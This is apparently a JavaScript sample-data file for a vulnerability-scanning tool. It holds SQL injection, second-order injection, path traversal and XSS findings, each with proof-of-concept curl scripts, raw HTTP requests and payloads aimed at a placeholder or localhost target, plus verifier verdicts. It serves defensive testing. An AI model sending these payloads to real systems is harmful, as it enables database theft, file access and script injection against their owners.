const SAMPLES = {
  "zip": {
    "findings": [
      {
        "id": "JAVA-071d7bb1eab2",
        "title": "OrderController SQL 注入（CWE-89）",
        "severity": "critical",
        "cwe": "CWE-89",
        "location": {
          "file": "OrderController.java",
          "line_start": 8,
          "line_end": 10,
          "endpoint": "/orders/create",
          "http_method": "POST"
        },
        "description": "外部输入来自 query `name`；攻击者可控数据经过 0 个传播/校验节点后，到达 `OrderController.java:10` 的危险操作。链路上的关键跳转与绕过原因已记录在 exploit_chain 中，未发现有效白名单、参数化或上下文编码阻断。",
        "poc": {
          "description": "针对 /orders/create（POST）的 SQL 注入 POC。注入点：POST 参数 name；payload 使用 TARGET 占位符。",
          "preconditions": [
            "目标应用已部署且路由可达",
            "入口 /orders/create 使用 POST",
            "测试已获得明确授权，且仅使用 TARGET 占位符"
          ],
          "steps": [
            {
              "step": 1,
              "action": "确认目标可达且已获授权",
              "request": "curl -sS -i 'http://TARGET:8080/orders/create'",
              "expected_response": "返回应用页面/接口响应，而不是连接失败"
            },
            {
              "step": 2,
              "action": "发送 SQL 注入 载荷",
              "request": "curl -sS -i -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=%27%20OR%20%271%27%3D%271&Submit=Submit'",
              "expected_response": "布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。"
            },
            {
              "step": 3,
              "action": "记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道",
              "request": "",
              "expected_response": "出现与基线不同的内容、状态码、延迟或副作用"
            }
          ],
          "payload": "' OR '1'='1",
          "impact": "攻击者可读取/篡改数据库、绕过认证，造成大规模数据泄露。",
          "cve_justification": "符合 CWE-89。漏洞位于可交付代码 OrderController.java:10，外部输入来自 query `name`，source→sink 链已静态闭合，且未发现有效净化；具备远程触发条件。",
          "scripts": {
            "poc.sh": "#!/usr/bin/env sh\nset -eu\n# 仅限授权测试；替换 TARGET 后手动执行\ncurl -sS -i -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=%27%20OR%20%271%27%3D%271&Submit=Submit'\n",
            "request.http": "POST /orders/create HTTP/1.1\r\nHost: TARGET:8080\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 44\r\n\r\nname=%27%20OR%20%271%27%3D%271&Submit=Submit\n"
          },
          "safety": {
            "executed": false,
            "network_egress": false,
            "requires_authorization": true,
            "target_uses_placeholder": true,
            "warnings": [
              "POC 叙述未明确标注 source→sink 注入点",
              "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
            ],
            "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
            "contract_validation": {
              "status": "static_consistent",
              "errors": [],
              "warnings": [
                "POC 叙述未明确标注 source→sink 注入点",
                "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
              ],
              "checks": {
                "static_only": false,
                "executed": false,
                "endpoint": "/orders/create",
                "method": "POST"
              }
            }
          },
          "artifact_dir": "poc/JAVA-071d7bb1eab2"
        }
      },
      {
        "id": "SO-686f72ecda74",
        "title": "OrderController 二次注入（CWE-89）",
        "severity": "critical",
        "cwe": "CWE-89",
        "location": {
          "file": "OrderController.java",
          "line_start": 10,
          "line_end": 15,
          "endpoint": "/orders/search",
          "http_method": "GET"
        },
        "description": "攻击者输入先通过 /orders/create 写入 sql（sql:orders），之后由 /orders/search 读出到变量，并在 OrderController.java:15 拼接进危险汇点。第一阶段的净化无法覆盖第二阶段的上下文，构成跨请求二次注入。",
        "poc": {
          "description": "两阶段二次注入：第一阶段把带标记的注入载荷写入持久化存储；第二阶段触发读取已存储值并拼接进危险汇点。",
          "preconditions": [
            "第一阶段与第二阶段访问同一应用、同一数据库/session/cache 命名空间",
            "存储写点缺少参数化或上下文相关转义",
            "读取后的值在第二上下文未再次校验"
          ],
          "steps": [
            {
              "step": 1,
              "action": "写入载荷到 sql（sql:orders）",
              "request": "curl -sS -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=x%27%20OR%20%271%27%3D%271%27%20--%20SUNSET2O'",
              "expected_response": "写入成功（2xx/3xx），无参数化拒绝"
            },
            {
              "step": 2,
              "action": "触发读取已存储值",
              "request": "curl -sS -X GET 'http://TARGET:8080/orders/search'",
              "expected_response": "响应出现 SUNSET2O 标记、SQL 报错、全量数据或异常行为"
            },
            {
              "step": 3,
              "action": "确认持久化值在第二阶段进入 sink",
              "request": "（静态证据）见 exploit_chain 的 store→read→sink 三步",
              "expected_response": "无需动态验证；以响应差异/错误作为人工复核依据"
            }
          ],
          "payload": "x' OR '1'='1' -- SUNSET2O",
          "impact": "攻击者可绕过第一阶段的净化，在第二阶段改变 SQL/命令/模板语义，造成数据泄露、越权或 RCE。",
          "cve_justification": "符合 CWE-89。二次注入具有外部可达入口、跨请求持久化、读取后进入危险汇点三个要素；第一阶段的安全检查无法覆盖第二阶段上下文。",
          "scripts": {
            "poc_store.sh": "#!/usr/bin/env sh\nset -eu\ncurl -sS -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=x%27%20OR%20%271%27%3D%271%27%20--%20SUNSET2O'\n",
            "poc_trigger.sh": "#!/usr/bin/env sh\nset -eu\ncurl -sS -X GET 'http://TARGET:8080/orders/search'\n",
            "poc_all.sh": "#!/usr/bin/env sh\nset -eu\ncurl -sS -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=x%27%20OR%20%271%27%3D%271%27%20--%20SUNSET2O'\ncurl -sS -X GET 'http://TARGET:8080/orders/search'\n"
          },
          "safety": {
            "executed": false,
            "network_egress": false,
            "requires_authorization": true,
            "target_uses_placeholder": true,
            "warnings": [
              "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
            ],
            "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
            "contract_validation": {
              "status": "static_consistent",
              "errors": [],
              "warnings": [
                "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
              ],
              "checks": {
                "static_only": false,
                "executed": false,
                "endpoint": "/orders/search",
                "method": "GET"
              }
            }
          },
          "artifact_dir": "poc/SO-686f72ecda74"
        }
      },
      {
        "id": "JAVA-9f454be81455",
        "title": "SampleTraversal 路径穿越 / 任意文件读写（CWE-22）",
        "severity": "high",
        "cwe": "CWE-22",
        "location": {
          "file": "SampleTraversal.java",
          "line_start": 7,
          "line_end": 9,
          "endpoint": "/SampleTraversal",
          "http_method": "POST"
        },
        "description": "外部输入来自 header `X-File`；攻击者可控数据经过 1 个传播/校验节点后，到达 `SampleTraversal.java:9` 的危险操作。链路上的关键跳转与绕过原因已记录在 exploit_chain 中，未发现有效白名单、参数化或上下文编码阻断。",
        "poc": {
          "description": "针对 /SampleTraversal（POST）的 路径穿越 / 任意文件读写 POC。注入点：Header: X-File；payload 使用 TARGET 占位符。",
          "preconditions": [
            "目标应用已部署且路由可达",
            "入口 /SampleTraversal 使用 POST",
            "测试已获得明确授权，且仅使用 TARGET 占位符"
          ],
          "steps": [
            {
              "step": 1,
              "action": "确认目标可达且已获授权",
              "request": "curl -sS -i 'http://TARGET:8080/SampleTraversal'",
              "expected_response": "返回应用页面/接口响应，而不是连接失败"
            },
            {
              "step": 2,
              "action": "发送 路径穿越 / 任意文件读写 载荷",
              "request": "curl -sS -i -X POST 'http://TARGET:8080/SampleTraversal' \\\n  -H 'X-File: ..%2F..%2F..%2F..%2Ftmp%2Fsunset_JAVA9f45.txt'",
              "expected_response": "响应出现目标文件路径；若为写操作，TARGET 上出现 testfiles 目录之外的文件；若为读操作，响应包含文件内容。"
            },
            {
              "step": 3,
              "action": "记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道",
              "request": "",
              "expected_response": "出现与基线不同的内容、状态码、延迟或副作用"
            }
          ],
          "payload": "../../../../tmp/sunset_JAVA9f45.txt",
          "impact": "攻击者可读取敏感文件或写入/覆盖任意文件，可能导致凭据泄露、配置篡改乃至 RCE。",
          "cve_justification": "符合 CWE-22。漏洞位于可交付代码 SampleTraversal.java:9，外部输入来自 header `X-File`，source→sink 链已静态闭合，且未发现有效净化；具备远程触发条件。",
          "scripts": {
            "poc.sh": "#!/usr/bin/env sh\nset -eu\n# 仅限授权测试；替换 TARGET 后手动执行\ncurl -sS -i -X POST 'http://TARGET:8080/SampleTraversal' \\\n  -H 'X-File: ..%2F..%2F..%2F..%2Ftmp%2Fsunset_JAVA9f45.txt'\n",
            "request.http": "POST /SampleTraversal HTTP/1.1\r\nHost: TARGET:8080\r\nAccept: */*\r\nX-File: ..%2F..%2F..%2F..%2Ftmp%2Fsunset_JAVA9f45.txt\r\n\r\n\n"
          },
          "safety": {
            "executed": false,
            "network_egress": false,
            "requires_authorization": true,
            "target_uses_placeholder": true,
            "warnings": [
              "POC 叙述未明确标注 source→sink 注入点",
              "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
            ],
            "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
            "contract_validation": {
              "status": "static_consistent",
              "errors": [],
              "warnings": [
                "POC 叙述未明确标注 source→sink 注入点",
                "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
              ],
              "checks": {
                "static_only": false,
                "executed": false,
                "endpoint": "/SampleTraversal",
                "method": "POST"
              }
            }
          },
          "artifact_dir": "poc/JAVA-9f454be81455"
        }
      }
    ],
    "verdicts": [
      {
        "finding_id": "JAVA-071d7bb1eab2",
        "verdict": "inconclusive",
        "target_url": "http://127.0.0.1:8080/orders/create",
        "reason": "no SQL error or row-set change observed (possible blind injection)",
        "baseline": {
          "status": 200
        },
        "attack": {
          "status": 200
        }
      },
      {
        "finding_id": "SO-686f72ecda74",
        "verdict": "inconclusive",
        "target_url": "http://127.0.0.1:8080/orders/search",
        "reason": "no SQL error or row-set change observed (possible blind injection)",
        "baseline": {
          "status": 200
        },
        "attack": {
          "status": 200
        }
      },
      {
        "finding_id": "JAVA-9f454be81455",
        "verdict": "rejected",
        "target_url": "http://127.0.0.1:8080/SampleTraversal",
        "reason": "no traversal marker or path reflection observed",
        "baseline": {
          "status": 200
        },
        "attack": {
          "status": 200
        }
      }
    ]
  },
  "url": {
    "findings": [
      {
        "id": "URL-12de7e3ad285",
        "title": "AWVS: Cross-site Scripting (XSS)",
        "severity": "high",
        "cwe": "CWE-79",
        "location": {
          "file": "",
          "line_start": 0,
          "line_end": 0,
          "endpoint": "/",
          "http_method": "GET"
        },
        "description": "AWVS reported `Cross-site Scripting (XSS)` at `http://127.0.0.1:8080/?q=hello`. Evidence: Local AWVS-compatible probe observed unencoded script reflection. baseline HTTP 200 (23 bytes); attack HTTP 200 (43 bytes); marker='<script>alert(1)</script>'.. This URL-mode finding has no source file/line; it must be validated dynamically.",
        "poc": {
          "description": "AWVS candidate on http://127.0.0.1:8080/?q=hello (Cross-site Scripting (XSS)). Injection channel: query `q`. Raw request is preserved; the verifier resolves TARGET and replays it.",
          "preconditions": [
            "Target is running and the endpoint is reachable.",
            "Input channel: query `q`.",
            "The POC is passive text; VulnCatcher-Verify owns execution against an allowlisted local target."
          ],
          "steps": [
            {
              "step": 1,
              "action": "Baseline request",
              "request": "curl -sS -i -X GET 'http://TARGET:8080/?q=SafeText' \\\n  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \\\n  -H 'Accept: */*'",
              "expected_response": "HTTP 200 and the normal application response."
            },
            {
              "step": 2,
              "action": "Replay the AWVS attack request (跨站脚本)",
              "request": "curl -sS -i -X GET 'http://TARGET:8080/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E' \\\n  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \\\n  -H 'Accept: */*'",
              "expected_response": "The response contains the raw script payload without HTML encoding."
            },
            {
              "step": 3,
              "action": "Compare baseline and attack responses",
              "request": "",
              "expected_response": "A security-relevant differential appears."
            }
          ],
          "payload": "<script>alert(1)</script>",
          "impact": "AWVS reported 跨站脚本 at http://127.0.0.1:8080/?q=hello; this can lead to unauthorized data access or execution depending on the endpoint.",
          "cve_justification": "AWVS candidate: Cross-site Scripting (XSS); CWE=CWE-79. Dynamic evidence came from the scanner/local probe; source mapping is unavailable in URL mode.",
          "scripts": {
            "poc.sh": "#!/usr/bin/env sh\nset -eu\n# Authorized testing only. Replace TARGET after review.\ncurl -sS -i -X GET 'http://TARGET:8080/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E' \\\n  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \\\n  -H 'Accept: */*'\n",
            "request.http": "GET /?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Sunset-AWVS-Probe/2.0\r\nAccept: */*\r\nConnection: close\r\n\n"
          },
          "safety": {
            "executed": false,
            "network_egress": false,
            "requires_authorization": true,
            "target_uses_placeholder": true,
            "warnings": [
              "POC 叙述未明确标注 source→sink 注入点",
              "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
            ],
            "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
            "contract_validation": {
              "status": "static_consistent",
              "errors": [],
              "warnings": [
                "POC 叙述未明确标注 source→sink 注入点",
                "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
              ],
              "checks": {
                "static_only": false,
                "executed": false,
                "endpoint": "/",
                "method": "GET"
              }
            }
          },
          "artifact_dir": "poc/URL-12de7e3ad285"
        }
      }
    ],
    "verdicts": [
      {
        "finding_id": "URL-12de7e3ad285",
        "verdict": "verified",
        "target_url": "http://127.0.0.1:8080/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "reason": "unencoded script payload reflected in attack response",
        "baseline": {
          "status": 200
        },
        "attack": {
          "status": 200
        }
      }
    ]
  },
  "hybrid": {
    "findings": [
      {
        "id": "JAVA-071d7bb1eab2",
        "title": "OrderController SQL 注入（CWE-89）",
        "severity": "critical",
        "cwe": "CWE-89",
        "location": {
          "file": "OrderController.java",
          "line_start": 8,
          "line_end": 10,
          "endpoint": "/orders/create",
          "http_method": "POST"
        },
        "description": "外部输入来自 query `name`；攻击者可控数据经过 0 个传播/校验节点后，到达 `OrderController.java:10` 的危险操作。链路上的关键跳转与绕过原因已记录在 exploit_chain 中，未发现有效白名单、参数化或上下文编码阻断。",
        "poc": {
          "description": "针对 /orders/create（POST）的 SQL 注入 POC。注入点：POST 参数 name；payload 使用 TARGET 占位符。",
          "preconditions": [
            "目标应用已部署且路由可达",
            "入口 /orders/create 使用 POST",
            "测试已获得明确授权，且仅使用 TARGET 占位符"
          ],
          "steps": [
            {
              "step": 1,
              "action": "确认目标可达且已获授权",
              "request": "curl -sS -i 'http://TARGET:8080/orders/create'",
              "expected_response": "返回应用页面/接口响应，而不是连接失败"
            },
            {
              "step": 2,
              "action": "发送 SQL 注入 载荷",
              "request": "curl -sS -i -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=%27%20OR%20%271%27%3D%271&Submit=Submit'",
              "expected_response": "布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。"
            },
            {
              "step": 3,
              "action": "记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道",
              "request": "",
              "expected_response": "出现与基线不同的内容、状态码、延迟或副作用"
            }
          ],
          "payload": "' OR '1'='1",
          "impact": "攻击者可读取/篡改数据库、绕过认证，造成大规模数据泄露。",
          "cve_justification": "符合 CWE-89。漏洞位于可交付代码 OrderController.java:10，外部输入来自 query `name`，source→sink 链已静态闭合，且未发现有效净化；具备远程触发条件。",
          "scripts": {
            "poc.sh": "#!/usr/bin/env sh\nset -eu\n# 仅限授权测试；替换 TARGET 后手动执行\ncurl -sS -i -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=%27%20OR%20%271%27%3D%271&Submit=Submit'\n",
            "request.http": "POST /orders/create HTTP/1.1\r\nHost: TARGET:8080\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 44\r\n\r\nname=%27%20OR%20%271%27%3D%271&Submit=Submit\n"
          },
          "safety": {
            "executed": false,
            "network_egress": false,
            "requires_authorization": true,
            "target_uses_placeholder": true,
            "warnings": [
              "POC 叙述未明确标注 source→sink 注入点",
              "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
            ],
            "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
            "contract_validation": {
              "status": "static_consistent",
              "errors": [],
              "warnings": [
                "POC 叙述未明确标注 source→sink 注入点",
                "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
              ],
              "checks": {
                "static_only": false,
                "executed": false,
                "endpoint": "/orders/create",
                "method": "POST"
              }
            }
          },
          "artifact_dir": "poc/JAVA-071d7bb1eab2"
        }
      },
      {
        "id": "SO-686f72ecda74",
        "title": "OrderController 二次注入（CWE-89）",
        "severity": "critical",
        "cwe": "CWE-89",
        "location": {
          "file": "OrderController.java",
          "line_start": 10,
          "line_end": 15,
          "endpoint": "/orders/search",
          "http_method": "GET"
        },
        "description": "攻击者输入先通过 /orders/create 写入 sql（sql:orders），之后由 /orders/search 读出到变量，并在 OrderController.java:15 拼接进危险汇点。第一阶段的净化无法覆盖第二阶段的上下文，构成跨请求二次注入。",
        "poc": {
          "description": "两阶段二次注入：第一阶段把带标记的注入载荷写入持久化存储；第二阶段触发读取已存储值并拼接进危险汇点。",
          "preconditions": [
            "第一阶段与第二阶段访问同一应用、同一数据库/session/cache 命名空间",
            "存储写点缺少参数化或上下文相关转义",
            "读取后的值在第二上下文未再次校验"
          ],
          "steps": [
            {
              "step": 1,
              "action": "写入载荷到 sql（sql:orders）",
              "request": "curl -sS -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=x%27%20OR%20%271%27%3D%271%27%20--%20SUNSET2O'",
              "expected_response": "写入成功（2xx/3xx），无参数化拒绝"
            },
            {
              "step": 2,
              "action": "触发读取已存储值",
              "request": "curl -sS -X GET 'http://TARGET:8080/orders/search'",
              "expected_response": "响应出现 SUNSET2O 标记、SQL 报错、全量数据或异常行为"
            },
            {
              "step": 3,
              "action": "确认持久化值在第二阶段进入 sink",
              "request": "（静态证据）见 exploit_chain 的 store→read→sink 三步",
              "expected_response": "无需动态验证；以响应差异/错误作为人工复核依据"
            }
          ],
          "payload": "x' OR '1'='1' -- SUNSET2O",
          "impact": "攻击者可绕过第一阶段的净化，在第二阶段改变 SQL/命令/模板语义，造成数据泄露、越权或 RCE。",
          "cve_justification": "符合 CWE-89。二次注入具有外部可达入口、跨请求持久化、读取后进入危险汇点三个要素；第一阶段的安全检查无法覆盖第二阶段上下文。",
          "scripts": {
            "poc_store.sh": "#!/usr/bin/env sh\nset -eu\ncurl -sS -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=x%27%20OR%20%271%27%3D%271%27%20--%20SUNSET2O'\n",
            "poc_trigger.sh": "#!/usr/bin/env sh\nset -eu\ncurl -sS -X GET 'http://TARGET:8080/orders/search'\n",
            "poc_all.sh": "#!/usr/bin/env sh\nset -eu\ncurl -sS -X POST 'http://TARGET:8080/orders/create' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'name=x%27%20OR%20%271%27%3D%271%27%20--%20SUNSET2O'\ncurl -sS -X GET 'http://TARGET:8080/orders/search'\n"
          },
          "safety": {
            "executed": false,
            "network_egress": false,
            "requires_authorization": true,
            "target_uses_placeholder": true,
            "warnings": [
              "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
            ],
            "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
            "contract_validation": {
              "status": "static_consistent",
              "errors": [],
              "warnings": [
                "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
              ],
              "checks": {
                "static_only": false,
                "executed": false,
                "endpoint": "/orders/search",
                "method": "GET"
              }
            }
          },
          "artifact_dir": "poc/SO-686f72ecda74"
        }
      },
      {
        "id": "JAVA-9f454be81455",
        "title": "SampleTraversal 路径穿越 / 任意文件读写（CWE-22）",
        "severity": "high",
        "cwe": "CWE-22",
        "location": {
          "file": "SampleTraversal.java",
          "line_start": 7,
          "line_end": 9,
          "endpoint": "/SampleTraversal",
          "http_method": "POST"
        },
        "description": "外部输入来自 header `X-File`；攻击者可控数据经过 1 个传播/校验节点后，到达 `SampleTraversal.java:9` 的危险操作。链路上的关键跳转与绕过原因已记录在 exploit_chain 中，未发现有效白名单、参数化或上下文编码阻断。",
        "poc": {
          "description": "针对 /SampleTraversal（POST）的 路径穿越 / 任意文件读写 POC。注入点：Header: X-File；payload 使用 TARGET 占位符。",
          "preconditions": [
            "目标应用已部署且路由可达",
            "入口 /SampleTraversal 使用 POST",
            "测试已获得明确授权，且仅使用 TARGET 占位符"
          ],
          "steps": [
            {
              "step": 1,
              "action": "确认目标可达且已获授权",
              "request": "curl -sS -i 'http://TARGET:8080/SampleTraversal'",
              "expected_response": "返回应用页面/接口响应，而不是连接失败"
            },
            {
              "step": 2,
              "action": "发送 路径穿越 / 任意文件读写 载荷",
              "request": "curl -sS -i -X POST 'http://TARGET:8080/SampleTraversal' \\\n  -H 'X-File: ..%2F..%2F..%2F..%2Ftmp%2Fsunset_JAVA9f45.txt'",
              "expected_response": "响应出现目标文件路径；若为写操作，TARGET 上出现 testfiles 目录之外的文件；若为读操作，响应包含文件内容。"
            },
            {
              "step": 3,
              "action": "记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道",
              "request": "",
              "expected_response": "出现与基线不同的内容、状态码、延迟或副作用"
            }
          ],
          "payload": "../../../../tmp/sunset_JAVA9f45.txt",
          "impact": "攻击者可读取敏感文件或写入/覆盖任意文件，可能导致凭据泄露、配置篡改乃至 RCE。",
          "cve_justification": "符合 CWE-22。漏洞位于可交付代码 SampleTraversal.java:9，外部输入来自 header `X-File`，source→sink 链已静态闭合，且未发现有效净化；具备远程触发条件。",
          "scripts": {
            "poc.sh": "#!/usr/bin/env sh\nset -eu\n# 仅限授权测试；替换 TARGET 后手动执行\ncurl -sS -i -X POST 'http://TARGET:8080/SampleTraversal' \\\n  -H 'X-File: ..%2F..%2F..%2F..%2Ftmp%2Fsunset_JAVA9f45.txt'\n",
            "request.http": "POST /SampleTraversal HTTP/1.1\r\nHost: TARGET:8080\r\nAccept: */*\r\nX-File: ..%2F..%2F..%2F..%2Ftmp%2Fsunset_JAVA9f45.txt\r\n\r\n\n"
          },
          "safety": {
            "executed": false,
            "network_egress": false,
            "requires_authorization": true,
            "target_uses_placeholder": true,
            "warnings": [
              "POC 叙述未明确标注 source→sink 注入点",
              "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
            ],
            "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
            "contract_validation": {
              "status": "static_consistent",
              "errors": [],
              "warnings": [
                "POC 叙述未明确标注 source→sink 注入点",
                "原始 payload 未直接出现在请求文本中，可能经过 URL 编码"
              ],
              "checks": {
                "static_only": false,
                "executed": false,
                "endpoint": "/SampleTraversal",
                "method": "POST"
              }
            }
          },
          "artifact_dir": "poc/JAVA-9f454be81455"
        }
      },
      {
        "id": "AWVS-fb8d28939452",
        "title": "AWVS: Cross-site Scripting (XSS)",
        "severity": "high",
        "cwe": "CWE-79",
        "location": {
          "file": "",
          "line_start": 0,
          "line_end": 0,
          "endpoint": "/",
          "http_method": "GET"
        },
        "description": "Local AWVS-compatible probe observed unencoded script reflection. baseline HTTP 200 (23 bytes); attack HTTP 200 (43 bytes); marker='<script>alert(1)</script>'.",
        "poc": {
          "description": "AWVS 外部扫描发现：Cross-site Scripting (XSS) @ http://127.0.0.1:8080/?q=hello",
          "preconditions": [
            "AWVS 扫描已完成",
            "目标可达",
            "已获得授权"
          ],
          "steps": [
            {
              "step": 1,
              "action": "重放 AWVS 记录的请求",
              "request": "GET /?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Sunset-AWVS-Probe/2.0\r\nAccept: */*\r\nConnection: close",
              "expected_response": "复现 AWVS 报告中的问题"
            }
          ],
          "payload": "",
          "impact": "Local AWVS-compatible probe observed unencoded script reflection. baseline HTTP 200 (23 bytes); attack HTTP 200 (43 bytes); marker='<script>alert(1)</script>'.",
          "cve_justification": "AWVS 报告：Cross-site Scripting (XSS)；CWE=79。外部扫描结果仅作为佐证。",
          "scripts": {
            "awvs_request.http": "GET /?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Sunset-AWVS-Probe/2.0\r\nAccept: */*\r\nConnection: close\n",
            "poc_readme.md": "# AWVS 外部发现\n\n- 名称: Cross-site Scripting (XSS)\n- URL: http://127.0.0.1:8080/?q=hello\n- 严重度: high\n- CWE: 79\n\n该 POC 来自 AWVS 报告回灌，本管线未执行。\n"
          },
          "safety": {
            "executed": false,
            "network_egress": false,
            "requires_authorization": true,
            "target_uses_placeholder": false,
            "warnings": [
              "HTTP POC 未使用 TARGET 占位符",
              "POC 未使用 TARGET 占位符，请人工检查目标地址"
            ],
            "policy": "POC 仅为文本工件；管线不会执行、不会联网、不会搭建沙箱。",
            "contract_validation": {
              "status": "static_inconsistent",
              "errors": [
                "HTTP POC 未使用 TARGET 占位符"
              ],
              "warnings": [],
              "checks": {
                "static_only": false,
                "executed": false,
                "endpoint": "/",
                "method": "GET"
              }
            }
          },
          "artifact_dir": "poc/AWVS-fb8d28939452"
        }
      }
    ],
    "verdicts": [
      {
        "finding_id": "JAVA-071d7bb1eab2",
        "verdict": "inconclusive",
        "target_url": "http://127.0.0.1:8080/orders/create",
        "reason": "no SQL error or row-set change observed (possible blind injection)",
        "baseline": {
          "status": 200
        },
        "attack": {
          "status": 200
        }
      },
      {
        "finding_id": "SO-686f72ecda74",
        "verdict": "inconclusive",
        "target_url": "http://127.0.0.1:8080/orders/search",
        "reason": "no SQL error or row-set change observed (possible blind injection)",
        "baseline": {
          "status": 200
        },
        "attack": {
          "status": 200
        }
      },
      {
        "finding_id": "JAVA-9f454be81455",
        "verdict": "rejected",
        "target_url": "http://127.0.0.1:8080/SampleTraversal",
        "reason": "no traversal marker or path reflection observed",
        "baseline": {
          "status": 200
        },
        "attack": {
          "status": 200
        }
      },
      {
        "finding_id": "AWVS-fb8d28939452",
        "verdict": "rejected",
        "target_url": "http://127.0.0.1:8080/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "reason": "no unencoded script reflection observed",
        "baseline": {
          "status": 200
        },
        "attack": {
          "status": 200
        }
      }
    ]
  }
};
